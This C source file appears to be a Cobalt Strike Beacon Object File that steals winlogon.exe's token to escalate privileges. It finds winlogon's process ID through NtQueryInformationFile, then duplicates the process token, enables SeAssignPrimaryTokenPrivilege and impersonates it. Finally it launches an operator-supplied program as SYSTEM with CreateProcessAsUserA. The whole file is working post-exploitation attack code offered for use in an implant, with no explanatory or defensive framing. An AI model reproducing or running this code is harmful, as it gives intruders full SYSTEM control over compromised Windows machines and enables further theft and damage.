#include <windows.h>
#include <shlwapi.h>
#include "beacon.h"
#include "ntdefs.h"

typedef struct _FILE_PROCESS_IDS_USING_FILE_INFORMATION
{
    ULONG NumberOfProcessIdsInList;
    _Field_size_(NumberOfProcessIdsInList) ULONG_PTR ProcessIdList[1];
} FILE_PROCESS_IDS_USING_FILE_INFORMATION, *PFILE_PROCESS_IDS_USING_FILE_INFORMATION;

WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD,WINBOOL,DWORD);
WINBASEAPI UINT WINAPI KERNEL32$GetSystemDirectoryW(LPWSTR lpBuffer,UINT uSize);
WINBASEAPI UINT WINAPI KERNEL32$GetSystemDirectoryW(LPWSTR lpBuffer,UINT uSize);
WINADVAPI WINBOOL WINAPI ADVAPI32$OpenProcessToken (HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
WINADVAPI WINBOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE,DWORD,LPSECURITY_ATTRIBUTES,SECURITY_IMPERSONATION_LEVEL,TOKEN_TYPE,PHANDLE);
WINADVAPI WINBOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR,LPCSTR,PLUID);
WINADVAPI WINBOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE,WINBOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
WINADVAPI WINBOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE,DWORD,LPSECURITY_ATTRIBUTES,SECURITY_IMPERSONATION_LEVEL,TOKEN_TYPE,PHANDLE);
WINBASEAPI WINBOOL WINAPI SHLWAPI$PathAppendW(LPWSTR,LPCWSTR);
WINADVAPI BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
WINBASEAPI WINBOOL NTAPI NTDLL$RtlDosPathNameToNtPathName_U(PCWSTR,PUNICODE_STRING,PWSTR,PVOID);
WINBASEAPI WINBOOL NTAPI NTDLL$NtOpenFile(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PIO_STATUS_BLOCK,ULONG,ULONG);
WINBASEAPI WINBOOL NTAPI NTDLL$RtlNtStatusToDosError(NTSTATUS);
WINBASEAPI WINBOOL NTAPI NTDLL$NtQueryInformationFile(HANDLE,PIO_STATUS_BLOCK,PVOID,ULONG,ULONG);
WINBASEAPI WINBOOL WINAPI KERNEL32$CreateProcessAsUserA(HANDLE,LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,WINBOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
WINBASEAPI WINBOOL NTAPI NTDLL$NtClose(HANDLE);
WINBASEAPI VOID WINAPI KERNEL32$SetLastError(DWORD);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINADVAPI BOOL WINAPI ADVAPI32$RevertToSelf(void);
DECLSPEC_IMPORT int __cdecl MSVCRT$malloc(size_t);

DECLSPEC_IMPORT void __cdecl MSVCRT$free(void *);

DWORD FindWinLogon(){
  IO_STATUS_BLOCK statusblock = {0};
  DWORD id = 0;
  NTSTATUS ntStatus;
  WCHAR  path[MAX_PATH + 1];
  DWORD procID = 0;
  HANDLE fileHandle = NULL;
  OBJECT_ATTRIBUTES objAtt ={0};
  UNICODE_STRING ntPath = {0};
  BOOL status;
  int ret=0;
  int len = 1 << 12;
  FILE_PROCESS_IDS_USING_FILE_INFORMATION * fpi = NULL;



  do{
        ret = KERNEL32$GetSystemDirectoryW(path,MAX_PATH);
        if(ret == 0){
            BeaconPrintf(CALLBACK_OUTPUT,"GetSystemDirectoryW failed with %d\n",KERNEL32$GetLastError());
            goto cleanup;

        }

        status = SHLWAPI$PathAppendW(path,L"winlogon.exe");
        if(!status){
            BeaconPrintf(CALLBACK_OUTPUT,"PathAppendW failed with %d\n",KERNEL32$GetLastError());
            goto cleanup;

        }

        status = NTDLL$RtlDosPathNameToNtPathName_U(path,&ntPath,NULL,NULL);
        if(!status){
            BeaconPrintf(CALLBACK_OUTPUT,"RtlDosPathNameToNtPathName failed with %d\n",KERNEL32$GetLastError());
            goto cleanup;

        }
        InitializeObjectAttributes(&objAtt,&ntPath,OBJ_CASE_INSENSITIVE,0,NULL);

        ntStatus = NTDLL$NtOpenFile(&fileHandle,FILE_READ_ATTRIBUTES,&objAtt,&statusblock,FILE_SHARE_READ,NULL);
        if(!NT_SUCCESS(ntStatus)){
            KERNEL32$SetLastError(NTDLL$RtlNtStatusToDosError(ntStatus));
            BeaconPrintf(CALLBACK_OUTPUT,"NtOpenFile Failed with %d\n",KERNEL32$GetLastError());
            goto cleanup;

        }
        WCHAR * buffer = (WCHAR *)MSVCRT$malloc(len);
        do{
                ntStatus = NTDLL$NtQueryInformationFile(fileHandle,&statusblock,buffer,len,47);
                if(ntStatus == STATUS_INFO_LENGTH_MISMATCH){
                    len += len;
                    MSVCRT$free(buffer);
                    buffer = (WCHAR *)MSVCRT$malloc(len);
                }else{
                    break;
                }

        }while(TRUE);

        if(!NT_SUCCESS(ntStatus)){
            KERNEL32$SetLastError(NTDLL$RtlNtStatusToDosError(ntStatus));
            BeaconPrintf(CALLBACK_OUTPUT,"NtQueryInformationFile failed with %d\n",KERNEL32$GetLastError());
            goto cleanup;

        }

        fpi = (FILE_PROCESS_IDS_USING_FILE_INFORMATION *)buffer;
        if(fpi->NumberOfProcessIdsInList){
                id = (DWORD)fpi->ProcessIdList[0];
                MSVCRT$free(buffer);
            }
    }while(FALSE);
    goto cleanup;

cleanup:
    if(fileHandle != NULL){
        NTDLL$NtClose(fileHandle);
    }
    return id;



}

void go(char * args,int len){
  HANDLE newtok = NULL;
  HANDLE resToken = NULL;
  HANDLE hToken = NULL;
  DWORD pid = FindWinLogon();
  BOOL status;
  LUID assignluid = {0};
  TOKEN_PRIVILEGES tp = {0};
  STARTUPINFO si = {0};
  PROCESS_INFORMATION pi = {0};
  int userpid = 0;
  CHAR * proctoexec = NULL;
  if(!BeaconIsAdmin()){
           BeaconPrintf(CALLBACK_OUTPUT,"You must be a admin for this to work");
           return;
  }
  datap parser;
  BeaconDataParse(&parser,args,len);

  proctoexec = (char *)BeaconDataExtract(&parser,NULL);


  HANDLE hProc = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pid);
  if(hProc == NULL){
        BeaconPrintf(CALLBACK_OUTPUT,"Opening WinLogon Failed with %d\n",KERNEL32$GetLastError());
  }

  status =  ADVAPI32$OpenProcessToken(hProc,TOKEN_DUPLICATE,&hToken);
  if(!status){
    BeaconPrintf(CALLBACK_OUTPUT,"OpenProcessToken Failed with %d\n",KERNEL32$GetLastError());
    goto cleanup;
  }

  status = ADVAPI32$DuplicateTokenEx(hToken,TOKEN_ALL_ACCESS,NULL,SecurityImpersonation,TokenPrimary,&resToken);
  if(!status){
    BeaconPrintf(CALLBACK_OUTPUT,"DuplicateTokenEx Failed with %d\n",KERNEL32$GetLastError());
    goto cleanup;
  }
    status = ADVAPI32$LookupPrivilegeValueA(NULL,"SeAssignPrimaryTokenPrivilege",&assignluid);
  if(!status){
    BeaconPrintf(CALLBACK_OUTPUT,"LookupPrivilegeValueA Failed with %d\n",KERNEL32$GetLastError());
    goto cleanup;
  }

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = assignluid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  ADVAPI32$AdjustTokenPrivileges(resToken,FALSE,&tp,sizeof(tp),NULL,NULL);
  if(!status){
    BeaconPrintf(CALLBACK_OUTPUT,"AdjustTokenPrivileges Failed with %d\n",KERNEL32$GetLastError());
    goto cleanup;
  }


  ADVAPI32$ImpersonateLoggedOnUser(resToken);
  if(!status){
    BeaconPrintf(CALLBACK_OUTPUT,"ImpersonateLoggedOnUser Failed with %d\n",KERNEL32$GetLastError());
    goto cleanup;
  }
  status = ADVAPI32$DuplicateTokenEx(hToken,TOKEN_ALL_ACCESS,NULL,SecurityIdentification,TokenPrimary,&newtok);
  if(!status){
    BeaconPrintf(CALLBACK_OUTPUT,"DuplicateTokenEx Failed with %d\n",KERNEL32$GetLastError());
    goto cleanup;
  }
   status = KERNEL32$CreateProcessAsUserA(newtok,proctoexec,NULL,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi);
  if(!status){
    BeaconPrintf(CALLBACK_OUTPUT,"CreateProcessAsUserA failed with %d\n",KERNEL32$GetLastError());
    goto cleanup;
  }
  ADVAPI32$RevertToSelf();
  cleanup:
      if(hProc != NULL){
        NTDLL$NtClose(hProc);
      }
      if(hToken != NULL){
        NTDLL$NtClose(hToken);
      }
      if(resToken != NULL){
        NTDLL$NtClose(resToken);
      }
}
